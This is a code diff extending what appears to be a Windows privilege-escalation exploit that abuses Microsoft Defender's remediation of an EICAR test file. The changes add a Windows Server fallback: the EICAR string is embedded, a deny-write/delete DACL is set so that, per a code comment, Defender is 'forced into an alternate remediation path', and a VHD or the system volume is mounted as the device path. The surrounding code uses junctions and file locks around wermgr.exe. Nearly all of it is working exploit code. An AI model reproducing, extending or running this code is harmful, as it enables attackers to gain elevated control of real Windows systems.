@@ -26,6 +26,16 @@
 
 wchar_t zippath[MAX_PATH] = { 0 };
 
+// Server variant globals
+wchar_t g_devicepath[MAX_PATH] = { 0 };  // \Device\ path for mounted disk or system volume
+bool g_using_vhd = false;                // true if VHD mount succeeded, false if using system device
+HANDLE g_hvhd = NULL;                    // Handle to VHD if mounted
+
+// EICAR test string — used when ISO mount is unavailable (Server fallback)
+static const char EICAR_STRING[] =
+    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+static const DWORD EICAR_SIZE = sizeof(EICAR_STRING) - 1;
+
 
 HMODULE ntdllhm = GetModuleHandle(L"ntdll.dll");
 NTSTATUS(WINAPI* _NtSetInformationFile)(
@@ -78181,6 +78191,39 @@ HANDLE WriteEicar(wchar_t* workdir, wchar_t* isomnt)
 		}
 		return hfile;
 	}
+
+	// Server fallback: if no ISO mount (isomnt == NULL), use embedded EICAR string
+	if (!isomnt)
+	{
+		eicar_data = (char*)EICAR_STRING;
+		eicar_sz = EICAR_SIZE;
+		DWORD writtenbytes = NULL;
+		OVERLAPPED ovp = { 0 };
+		ovp.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+		WriteFile(hfile, eicar_data, eicar_sz, &writtenbytes, &ovp);
+		WaitForSingleObject(ovp.hEvent, INFINITE);
+		CloseHandle(ovp.hEvent);
+
+		// Set read-only DACL to simulate ISO read-only behavior
+		// Denies DELETE and WRITE to force Defender into alternate remediation path
+		SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
+		PSID pEveryoneSid = NULL;
+		AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);
+		DWORD aclSize = 256;
+		PACL pAcl = (PACL)malloc(aclSize);
+		InitializeAcl(pAcl, aclSize, ACL_REVISION);
+		AddAccessDeniedAce(pAcl, ACL_REVISION, GENERIC_WRITE | DELETE | FILE_WRITE_ATTRIBUTES, pEveryoneSid);
+		AddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_READ | GENERIC_EXECUTE | SYNCHRONIZE, pEveryoneSid);
+		SECURITY_DESCRIPTOR sd = { 0 };
+		InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+		SetSecurityDescriptorDacl(&sd, TRUE, pAcl, FALSE);
+		SetFileSecurityW(eicarpath, DACL_SECURITY_INFORMATION, &sd);
+		free(pAcl);
+		FreeSid(pEveryoneSid);
+
+		return hfile;
+	}
+
 	HANDLE hsrc = NULL;
 	wchar_t eicarsrcpath[MAX_PATH] = { 0 };
 	wsprintf(eicarsrcpath, L"%s\\wermgr.exe", isomnt);
@@ -78341,6 +78384,146 @@ bool CreateJunction(HANDLE hdir, wchar_t* target)
 		return false;
 	}
 	return true;
+}
+
+// Server variant: Try VHD mount first, then fall back to system device path
+bool MountVHD()
+{
+    GUID uid = { 0 };
+    RPC_WSTR wuid = { 0 };
+    UuidCreate(&uid);
+    UuidToStringW(&uid, &wuid);
+    wchar_t* wuid2 = (wchar_t*)wuid;
+    wchar_t vhdxpath[MAX_PATH] = { 0 };
+    ExpandEnvironmentStrings(L"%TEMP%\\RP_VHD_", vhdxpath, MAX_PATH);
+    wcscat(vhdxpath, wuid2);
+    wcscat(vhdxpath, L".vhdx");
+
+    VIRTUAL_STORAGE_TYPE vst = { VIRTUAL_STORAGE_TYPE_DEVICE_VHDX, VIRTUAL_STORAGE_TYPE_VENDOR_MS };
+    CREATE_VIRTUAL_DISK_PARAMETERS cvdp = { 0 };
+    cvdp.Version = CREATE_VIRTUAL_DISK_VERSION_2;
+    cvdp.Version2.MaximumSize = 64 * 1024 * 1024;
+    cvdp.Version2.SectorSizeInBytes = 512;
+
+    HANDLE hvhd = NULL;
+    DWORD retval = CreateVirtualDisk(&vst, vhdxpath, VIRTUAL_DISK_ACCESS_ALL, NULL, CREATE_VIRTUAL_DISK_FLAG_NONE, 0, &cvdp, NULL, &hvhd);
+    if (retval != ERROR_SUCCESS)
+    {
+        printf("MountVHD: CreateVirtualDisk failed, error: %d. Falling back.\n", retval);
+        return false;
+    }
+
+    retval = AttachVirtualDisk(hvhd, NULL, ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY | ATTACH_VIRTUAL_DISK_FLAG_NO_DRIVE_LETTER, NULL, 0, NULL);
+    if (retval != ERROR_SUCCESS)
+    {
+        printf("MountVHD: AttachVirtualDisk failed, error: %d. Falling back.\n", retval);
+        CloseHandle(hvhd);
+        DeleteFile(vhdxpath);
+        return false;
+    }
+
+    ULONG pathsz = MAX_PATH;
+    wchar_t physpath[MAX_PATH] = { 0 };
+    retval = GetVirtualDiskPhysicalPath(hvhd, &pathsz, physpath);
+    if (retval != ERROR_SUCCESS)
+    {
+        printf("MountVHD: GetVirtualDiskPhysicalPath failed, error: %d\n", retval);
+        DetachVirtualDisk(hvhd, DETACH_VIRTUAL_DISK_FLAG_NONE, 0);
+        CloseHandle(hvhd);
+        DeleteFile(vhdxpath);
+        return false;
+    }
+
+    wcscpy(g_devicepath, L"\\Device\\");
+    wcscat(g_devicepath, PathFindFileName(physpath));
+    g_hvhd = hvhd;
+    g_using_vhd = true;
+    printf("MountVHD: Attached VHD at %ws\n", g_devicepath);
+    return true;
+}
+
+bool GetSystemDevicePath()
+{
+    HANDLE hdir = NULL;
+    UNICODE_STRING devdir = { 0 };
+    RtlInitUnicodeString(&devdir, L"\\Device");
+    OBJECT_ATTRIBUTES devobjattr = { 0 };
+    InitializeObjectAttributes(&devobjattr, &devdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    NTSTATUS stat = NtOpenDirectoryObject(&hdir, DIRECTORY_QUERY, &devobjattr);
+    if (stat)
+    {
+        printf("GetSystemDevicePath: Failed to open \\Device, error: 0x%08X\n", stat);
+        return false;
+    }
+
+    BYTE buffer[4096] = { 0 };
+    ULONG context = 0;
+    ULONG retlen = 0;
+    bool found = false;
+
+    while (true)
+    {
+        stat = NtQueryDirectoryObject(hdir, buffer, sizeof(buffer), FALSE, context == 0, &context, &retlen);
+        if (stat) break;
+
+        OBJECT_DIRECTORY_INFORMATION* odi = (OBJECT_DIRECTORY_INFORMATION*)buffer;
+        while (odi->Name.Length > 0)
+        {
+            if (wcsncmp(odi->Name.Buffer, L"HarddiskVolume", 14) == 0)
+            {
+                wchar_t testpath[MAX_PATH] = { 0 };
+                wcscpy(testpath, L"\\Device\\");
+                wcscat(testpath, odi->Name.Buffer);
+                wcscat(testpath, L"\\");
+
+                UNICODE_STRING testus = { 0 };
+                RtlInitUnicodeString(&testus, testpath);
+                OBJECT_ATTRIBUTES testoa = { 0 };
+                InitializeObjectAttributes(&testoa, &testus, OBJ_CASE_INSENSITIVE, NULL, NULL);
+                HANDLE htest = NULL;
+                IO_STATUS_BLOCK iosb = { 0 };
+                stat = NtCreateFile(&htest, FILE_READ_ATTRIBUTES | FILE_READ_DATA, &testoa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_DIRECTORY_FILE, NULL, NULL);
+
+                if (htest && NT_SUCCESS(stat))
+                {
+                    wchar_t windir_test[MAX_PATH] = { 0 };
+                    wcscpy(windir_test, testpath);
+                    wcscat(windir_test, L"Windows");
+
+                    UNICODE_STRING wdus = { 0 };
+                    RtlInitUnicodeString(&wdus, windir_test);
+                    OBJECT_ATTRIBUTES wdoa = { 0 };
+                    InitializeObjectAttributes(&wdoa, &wdus, OBJ_CASE_INSENSITIVE, NULL, NULL);
+                    HANDLE hwd = NULL;
+                    IO_STATUS_BLOCK wdiosb = { 0 };
+                    stat = NtCreateFile(&hwd, FILE_READ_ATTRIBUTES, &wdoa, &wdiosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_DIRECTORY_FILE, NULL, NULL);
+
+                    if (hwd && NT_SUCCESS(stat))
+                    {
+                        CloseHandle(hwd);
+                        CloseHandle(htest);
+                        wcscpy(g_devicepath, L"\\Device\\");
+                        wcscat(g_devicepath, odi->Name.Buffer);
+                        found = true;
+                        printf("GetSystemDevicePath: Found system volume: %ws\n", g_devicepath);
+                        break;
+                    }
+                    CloseHandle(htest);
+                }
+            }
+            odi++;
+        }
+        if (found) break;
+    }
+
+    CloseHandle(hdir);
+    if (!found)
+    {
+        printf("GetSystemDevicePath: No accessible HarddiskVolume found\n");
+        return false;
+    }
+    g_using_vhd = false;
+    return true;
 }
 
 bool MountISO(HANDLE* hiso)
@@ -78588,7 +78771,33 @@ int main()
 	HANDLE hvirtdisk = NULL;
 	if (!MountISO(&hvirtdisk))
 	{
-		return 1;
+		// Server fallback: ISO mount failed, try VHD then system device path
+		printf("ISO mount failed (likely Windows Server). Trying VHD mount...\n");
+		if (!MountVHD())
+		{
+			printf("VHD mount failed. Trying system device path...\n");
+			if (!GetSystemDevicePath())
+			{
+				printf("No device path available. Cannot continue.\n");
+				return 1;
+			}
+		}
+	}
+	else
+	{
+		// ISO mount succeeded — get the device path from it
+		wchar_t _mntpath[MAX_PATH] = { 0 };
+		ULONG pathsz = MAX_PATH;
+		DWORD retval = GetVirtualDiskPhysicalPath(hvirtdisk, &pathsz, _mntpath);
+		if (retval)
+		{
+			printf("Failed to fetch mounted disk path, error : %d\n", retval);
+			return 1;
+		}
+		wcscpy(g_devicepath, L"\\Device\\");
+		wcscat(g_devicepath, PathFindFileName(_mntpath));
+		g_using_vhd = false;
+		g_hvhd = hvirtdisk;
 	}
 	wchar_t windir2[MAX_PATH] = { 0 };
 	GetWindowsDirectory(windir2, MAX_PATH);
@@ -78671,17 +78880,10 @@ int main()
 		printf("Failed to create working directory : %ws, error : 0x%0.8X\n", maindirname, dirstat);
 		return 1;
 	}
-	wchar_t _mntpath[MAX_PATH] = { 0 };
-	ULONG pathsz = MAX_PATH;
-	DWORD retval = GetVirtualDiskPhysicalPath(hvirtdisk, &pathsz, _mntpath);
-	if (retval)
-	{
-		printf("Failed to fetch mounted disk path, error : %d\n", retval);
-		return 1;
-	}
-	wchar_t mntpath[MAX_PATH] = { L"\\Device\\" };
-	wcscat(mntpath, PathFindFileName(_mntpath));
-	HANDLE heicar = WriteEicar(maindirname,mntpath);
+	wchar_t mntpath[MAX_PATH] = { 0 };
+	wcscpy(mntpath, g_devicepath);
+	// Server fallback: pass NULL for isomnt when using system device (no ISO to read from)
+	HANDLE heicar = WriteEicar(maindirname, g_using_vhd ? mntpath : NULL);
 	if (!heicar)
 		return 1;
 
@@ -78764,7 +78966,7 @@ int main()
 	InitializeObjectAttributes(&lockpathobjattr, &_lockpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 	iostat = { 0 };
 
-	CloseHandle(WriteEicar(maindirname, mntpath));
+	CloseHandle(WriteEicar(maindirname, g_using_vhd ? mntpath : NULL));
 
 	stat = NtCreateFile(&hlock1, GENERIC_READ, &lockpathobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, NULL, NULL, NULL);
 	if (stat)
@@ -78923,8 +79125,12 @@ int main()
 	CloseHandle(hdirtmp);
 	CloseHandle(hdir);
 
-	DetachVirtualDisk(hvirtdisk, DETACH_VIRTUAL_DISK_FLAG_NONE, NULL);
-	CloseHandle(hvirtdisk);
+	// Only detach virtual disk if one was actually mounted
+	if (g_hvhd)
+	{
+		DetachVirtualDisk(g_hvhd, DETACH_VIRTUAL_DISK_FLAG_NONE, NULL);
+		CloseHandle(g_hvhd);
+	}
 
 	WaitForSingleObject(hthread, INFINITE);
 	CloseHandle(hthread);
